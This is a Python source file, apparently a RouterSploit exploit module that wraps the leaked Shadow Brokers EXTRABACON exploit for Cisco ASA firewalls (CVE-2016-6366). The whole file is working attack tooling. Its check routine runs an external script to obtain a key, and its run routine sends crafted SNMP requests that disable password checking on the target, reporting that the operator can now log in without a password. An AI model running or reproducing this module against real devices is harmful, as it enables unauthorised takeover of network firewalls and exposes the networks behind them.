import subprocess

from routersploit import (
    exploits,
    print_success,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Shadow brokers Extrabacon python exploit for Cisco ASA
    """
    __info__ = {
        'name': 'Extrabacon_routesploit',
        'description': 'Buffer overflow in Cisco Adaptive Security Appliance '
                       'Software through 9.4.2.3 on ASA 5500, ASA 5500-X, ASA Services Module, ASA 1000V, ASAv, '
                       'Firepower 9300 ASA Security Module, PIX, and FWSM devices allows '
                       'remote authenticated users to execute arbitrary code via crafted IPv4 SNMP packets, '
                       'aka Bug ID CSCva92151 or EXTRABACON. '
                       'In order to successfully exploit this vulnerability SNMP community string is required ',
        'authors': [
             'Shadow Brokers',  # Python module
             'renos stoikos <rstoikos[at]gmail.com>',  # routersploit module
        ],
        'references': [
             'http://www.cvedetails.com/cve/cve-2016-6366',
        ],
        'devices': [
            'Cisco ASA 7.0.1 -> 9.4.23',
        ],
    }

    target = exploits.Option('', 'Target address e.g. 192.168.1.1', validators=validators.ipv4)  # target address
    mode = exploits.Option('pass-disable', 'To Disable password checking, mode = pass-disable, To enable password checking, mode = pass-enable')
    community = exploits.Option('cisco', 'ASA SNMP community string - replace with yours')
    key = exploits.Option('', 'required for exploitation, use check command to obtain')

    def run(self):
        if self.check():
            tar = self.target
            com = self.community
            print_success("Target is vulnerable")
            proc = subprocess.Popen(
                ["python", "routersploit/modules/exploits/routers/cisco/EXBA/extrabacon.py", "exec",
                 "-t", tar, "-k", self.key, "-c", com,
                 "--mode", self.mode], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)
            for line in proc.stdout:
                if self.mode == "pass-disable" and "detected" in line:
                    print_success('Exploit success! - you can now login without pass! dont forget to run the '
                                  'exploit with mode pass-enable to return to previous state')
                elif self.mode == "pass-enable" and "detected" in line:
                    print_success("ASA Returned to password authentication")

    def check(self):
        tar = self.target
        com = self.community
        if self.mode not in {'pass-disable', 'pass-enable'}:
            print "wrong mode option use only pass-disable or pass-enable"
        else:
            proc = subprocess.Popen(["python", "routersploit/modules/exploits/routers/cisco/EXBA/extrabacon.py", "info",
                                    "-t", tar, "-c", com], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)
            for line in proc.stdout:
                if "pass-disable" in line:
                    self.key = line.split()[4]
                    return True
            return False
